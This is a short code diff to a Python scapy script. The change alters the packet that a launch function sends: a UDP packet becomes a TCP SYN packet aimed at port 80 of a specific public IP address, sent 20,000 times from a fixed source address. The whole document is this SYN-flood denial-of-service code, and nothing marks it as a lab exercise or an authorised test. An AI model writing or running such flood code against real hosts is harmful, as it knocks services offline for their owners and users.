@@ -6,7 +6,7 @@ from scapy.all import *
 
 def launch():
     with print_lock:
-        p = (IP(src="10.128.0.4", dst="35.193.17.254") / UDP(sport=80, dport=1234)) / Raw(load="google")
+        p = (IP(src="10.128.0.4", dst="144.217.100.106") / TCP(sport=80, dport=80,flags="S"))
         send(p, count=20000)
 
 
